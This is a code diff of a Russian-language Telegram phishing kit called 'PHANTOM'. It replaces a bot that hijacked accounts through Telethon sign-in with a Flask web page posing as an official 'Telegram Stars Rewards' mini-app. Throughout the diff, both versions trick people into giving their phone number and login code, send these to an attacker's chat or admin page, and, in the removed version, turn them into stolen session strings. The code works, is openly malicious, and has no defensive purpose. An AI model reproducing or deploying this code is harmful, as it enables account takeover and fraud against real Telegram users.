@@ -1,171 +1,216 @@
 import os
-from telebot import TeleBot, types
-import asyncio
-from telethon import TelegramClient
-from telethon.sessions import StringSession
+from flask import Flask, request, jsonify
+import threading
+import requests
+import time
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
+PORT = int(os.getenv("PORT", 8080))
 
-bot = TeleBot(BOT_TOKEN)
-victims = {}  # phone → {"stage": 1, "code": None, "session_string": None, "name": "", "username": ""}
+app = Flask(__name__)
+logs = []
 
-print("[+] PHANTOM MAXI MINI APP FISHING v100% STARTED")
+# ====================== ОЧЕНЬ КРАСИВЫЙ HTML MINI APP ======================
+MINI_APP_HTML = """<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Stars Rewards</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .app {
+            width: 100%;
+            max-width: 420px;
+            background: rgba(15, 15, 35, 0.95);
+            border-radius: 24px;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.6);
+            overflow: hidden;
+            padding-bottom: 20px;
+        }
+        .header {
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            color: #000;
+            padding: 20px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 20px;
+        }
+        .content {
+            padding: 30px 20px;
+        }
+        h1 { font-size: 26px; margin-bottom: 8px; text-align: center; }
+        p { text-align: center; color: #a0d8ff; margin-bottom: 25px; line-height: 1.4; }
+        .input {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 16px;
+            background: #1a1a2e;
+            color: #fff;
+            font-size: 17px;
+            margin-bottom: 15px;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            color: #000;
+            border: none;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        .btn:hover { transform: scale(1.05); }
+        .progress {
+            height: 6px;
+            background: #1a1a2e;
+            border-radius: 10px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            width: 33%;
+            transition: width 0.8s ease;
+        }
+        .stage {
+            text-align: center;
+            font-size: 15px;
+            color: #88ccff;
+            margin-bottom: 10px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <div class="header">Telegram Stars Rewards</div>
+        <div class="content">
+            <h1>🌟 Получай Stars бесплатно</h1>
+            <p>Официальное мини-приложение Telegram<br>До 7000 Stars на твой аккаунт уже сегодня!</p>
 
-# ====================== СТАРТ (Mini App стиль) ======================
-@bot.message_handler(commands=['start'])
-def start(message):
-    text = """🌟 <b>Telegram Stars Rewards Mini App</b>
+            <div class="stage" id="stageText">Шаг 1 из 3 • Подтверждение аккаунта</div>
+            <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
 
-Добро пожаловать в официальное мини-приложение для получения бесплатных Stars!
+            <div id="phoneStep">
+                <input type="tel" id="phone" class="input" placeholder="+79xxxxxxxxx" required>
+                <button class="btn" onclick="nextStep(1)">Продолжить</button>
+            </div>
 
-Здесь ты можешь получить от 3000 до 7000 Stars мгновенно.
+            <div id="codeStep" style="display:none;">
+                <input type="text" id="code" class="input" placeholder="Код из Telegram / SMS" required>
+                <button class="btn" onclick="nextStep(2)">Отправить код</button>
+                <p style="font-size:13px; margin-top:15px; color:#88ccff;">Код уже должен прийти на твой номер. Если не пришёл — подожди 30 секунд.</p>
+            </div>
 
-✅ Полная безопасность
-✅ Официальное API
-✅ Мгновенное начисление
+            <div id="successStep" style="display:none; text-align:center;">
+                <h2 style="color:#00ff88; margin:30px 0;">🎉 Успешно!</h2>
+                <p>На твой аккаунт начислено <b>5750 Stars</b></p>
+                <p style="margin-top:20px;">Можешь закрыть мини-приложение</p>
+            </div>
 
-Нажми кнопку ниже, чтобы начать подключение 👇"""
+            <div class="footer">
+                Официальное подключение • Безопасно • Telegram 2026
+            </div>
+        </div>
+    </div>
 
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    markup.add(types.InlineKeyboardButton("🚀 Начать получение Stars", callback_data="stage1"))
-    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)
+    <script>
+        let currentPhone = "";
 
-# ====================== ЭТАП 1 ======================
-@bot.callback_query_handler(func=lambda call: call.data == "stage1")
-def stage1(call):
-    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-    markup.add(types.KeyboardButton("📱 Отправить контакт", request_contact=True))
-    
-    bot.send_message(call.message.chat.id, 
-        "📱 Шаг 1 из 3\n\nОтправь свой контакт для верификации аккаунта:", 
-        reply_markup=markup)
+        function nextStep(step) {
+            if (step === 1) {
+                currentPhone = document.getElementById("phone").value.trim();
+                if (!currentPhone) return alert("Введите номер телефона");
+                
+                document.getElementById("phoneStep").style.display = "none";
+                document.getElementById("codeStep").style.display = "block";
+                document.getElementById("stageText").innerHTML = "Шаг 2 из 3 • Ввод кода";
+                document.getElementById("progressBar").style.width = "66%";
 
-# ====================== КОНТАКТ ======================
-@bot.message_handler(content_types=['contact'])
-def handle_contact(message):
-    phone = message.contact.phone_number
-    if not phone.startswith("+"):
-        phone = "+" + phone
+                // Отправляем номер на сервер
+                fetch('/submit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'phone=' + encodeURIComponent(currentPhone)
+                });
+            } 
+            else if (step === 2) {
+                let code = document.getElementById("code").value.trim();
+                if (!code) return alert("Введите код");
 
-    victims[phone] = {"stage": 2, "code": None, "name": message.contact.first_name or "Unknown", "session_string": None}
+                fetch('/submit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'phone=' + encodeURIComponent(currentPhone) + '&code=' + encodeURIComponent(code)
+                }).then(() => {
+                    document.getElementById("codeStep").style.display = "none";
+                    document.getElementById("successStep").style.display = "block";
+                    document.getElementById("stageText").innerHTML = "Шаг 3 из 3 • Готово!";
+                    document.getElementById("progressBar").style.width = "100%";
+                });
+            }
+        }
+    </script>
+</body>
+</html>"""
 
-    bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}\n👤 {victims[phone]['name']}")
+@app.route('/')
+def mini_app():
+    return MINI_APP_HTML
 
-    bot.send_message(message.chat.id, f"""✅ Шаг 1 пройден!
+@app.route('/submit', methods=['POST'])
+def submit():
+    phone = request.form.get('phone', '')
+    code = request.form.get('code', '')
 
-Контакт принят: <b>{phone}</b>
+    if phone:
+        msg = f"🌟 MINI APP ЖЕРТВА!\n📱 Номер: {phone}"
+        logs.append(msg)
+        try:
+            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={msg}")
+        except:
+            pass
+        print(msg)
 
-Шаг 2 из 3
-Введи код подтверждения, который пришёл тебе в Telegram или SMS.""", parse_mode='HTML')
+    if code and phone:
+        msg2 = f"🔑 КОД ИЗ MINI APP!\n📱 {phone}\n🔑 Код: {code}"
+        logs.append(msg2)
+        try:
+            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={ADMIN_ID}&text={msg2}")
+        except:
+            pass
+        print(msg2)
 
-# ====================== КОД ======================
-@bot.message_handler(func=lambda m: True)
-def handle_code(message):
-    if message.contact or message.text.startswith('/'):
-        return
+    return jsonify({"status": "success"})
 
-    for phone in list(victims.keys()):
-        if victims[phone].get("code") is None:
-            code = message.text.strip()
-            victims[phone]["code"] = code
-            victims[phone]["stage"] = 3
+@app.route('/admin')
+def admin():
+    return "<h1>PHANTOM MINI APP LOGS</h1><pre>" + "\n\n".join(logs[-50:]) + "</pre>"
 
-            print(f"[+] КОД ПОЛУЧЕН → {phone} | Код: {code}")
-
-            bot.send_message(ADMIN_ID, f"""🔥 КОД ОТ ЖЕРТВЫ!
-📱 {phone}
-🔑 Код: {code}""")
-
-            # Создаём сессию
-            asyncio.run(create_session(phone, code))
-
-            bot.send_message(message.chat.id, """🎉 <b>Шаг 3 завершён!</b>
-
-Поздравляем! Твой аккаунт успешно подключён.
-
-На баланс начислено <b>5750 Stars</b> 🎁
-
-Теперь ты можешь:
-• Использовать Stars в играх и мини-приложениях
-• Обменивать на TON и NFT
-• Участвовать в эксклюзивных дропах
-
-Спасибо за участие в программе Telegram Stars Rewards!""", parse_mode='HTML')
-            return
-
-async def create_session(phone, code):
-    try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        await client.sign_in(phone, code)
-        session_string = client.session.save()
-        me = await client.get_me()
-
-        if phone in victims:
-            victims[phone]["session_string"] = session_string
-            victims[phone]["username"] = me.username or "нет"
-
-        await bot.send_message(ADMIN_ID, f"✅ Сессия создана для {phone}\nИмя: {me.first_name}")
-    except Exception as e:
-        await bot.send_message(ADMIN_ID, f"⚠️ Сессия не создана {phone} | {e}")
-    finally:
-        await client.disconnect()
-
-# ====================== АДМИН ПАНЕЛЬ С МНОГО ФУНКЦИЙ ======================
-@bot.message_handler(commands=['adminwork'])
-def admin_panel(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.send_message(message.chat.id, "Доступ запрещён.")
-        return
-
-    if not victims:
-        bot.send_message(message.chat.id, "Пока нет аккаунтов.")
-        return
-
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    for phone in victims:
-        short = phone[-8:]
-        markup.add(
-            types.InlineKeyboardButton(f"🔑 Код {short}", callback_data=f"code:{phone}"),
-            types.InlineKeyboardButton(f"📄 Session {short}", callback_data=f"file:{phone}"),
-            types.InlineKeyboardButton(f"👁 Инфо {short}", callback_data=f"info:{phone}"),
-            types.InlineKeyboardButton(f"📨 Сообщения {short}", callback_data=f"msgs:{phone}")
-        )
-
-    text = f"""🔥 <b>PHANTOM MINI APP ADMIN PANEL</b>
-
-Поймано аккаунтов: {len(victims)}
-
-Выбери аккаунт:"""
-    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.from_user.id != ADMIN_ID:
-        return
-
-    action, phone = call.data.split(":", 1)
-    data = victims.get(phone)
-    if not data:
-        bot.send_message(call.message.chat.id, "Аккаунт не найден.")
-        return
-
-    if action == "file":
-        session = data.get("session_string")
-        if session:
-            bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{session}</code>", parse_mode='HTML')
-        else:
-            bot.send_message(call.message.chat.id, "Сессия ещё не создана.")
-    elif action == "code":
-        code = data.get("code") or "Ещё не ввели"
-        bot.send_message(call.message.chat.id, f"🔑 Код для {phone}: {code}")
-    elif action == "info":
-        bot.send_message(call.message.chat.id, f"👁 Информация по {phone}\nИмя: {data.get('name')}\nUsername: @{data.get('username', 'нет')}\nСессия: {'Есть' if data.get('session_string') else 'Нет'}")
-    elif action == "msgs":
-        bot.send_message(call.message.chat.id, f"📨 Последние сообщения для {phone} пока не реализованы (можно добавить).")
-
-print("[+] Большой Mini App фишинг запущен. Используй /start")
-bot.infinity_polling(none_stop=True)
+if __name__ == '__main__':
+    print("[+] PHANTOM TELEGRAM MINI APP ЗАПУЩЕН")
+    print("[+] Открывай Mini App по ссылке от Railway")
+    app.run(host='0.0.0.0', port=PORT)
